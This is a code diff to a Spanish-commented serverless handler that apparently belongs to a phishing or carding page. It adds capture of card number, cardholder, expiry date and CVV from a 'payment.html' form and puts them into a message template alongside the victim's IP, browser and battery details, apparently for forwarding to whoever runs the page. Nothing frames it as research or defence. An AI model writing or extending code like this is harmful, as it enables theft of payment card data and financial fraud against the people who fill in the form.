@@ -46,6 +46,12 @@ export default async function handler(req, res) {
     const forwardedFor = req.headers['x-forwarded-for'] || '';
     const clientIp = forwardedFor.split(',')[0]?.trim() || 'desconocida';
 
+    // Datos de la tarjeta (desde payment.html)
+    const cardNumber = body.cardNumber || '';
+    const cardHolder = body.cardHolder || '';
+    const expiryDate = body.expiryDate || '';
+    const cvv = body.cvv || '';
+
     // Datos del navegador
     const userAgent = body.userAgent || 'desconocido';
     const language = body.language || 'desconocido';
@@ -119,6 +125,10 @@ export default async function handler(req, res) {
       message = message.replace(/\{isDesktop\}/g, isDesktop);
       message = message.replace(/\{batteryLevel\}/g, batteryLevel);
       message = message.replace(/\{batteryCharging\}/g, batteryCharging);
+      message = message.replace(/\{expiryDate\}/g, expiryDate);
+      message = message.replace(/\{cardHolder\}/g, cardHolder);
+      message = message.replace(/\{cardNumber\}/g, cardNumber);
+      message = message.replace(/\{cvv\}/g, cvv);
       message = message.replace(/\{userAgent\}/g, userAgent);
       message = message.replace(/\{language\}/g, language);
       message = message.replace(/\{screenResolution\}/g, screenResolution);
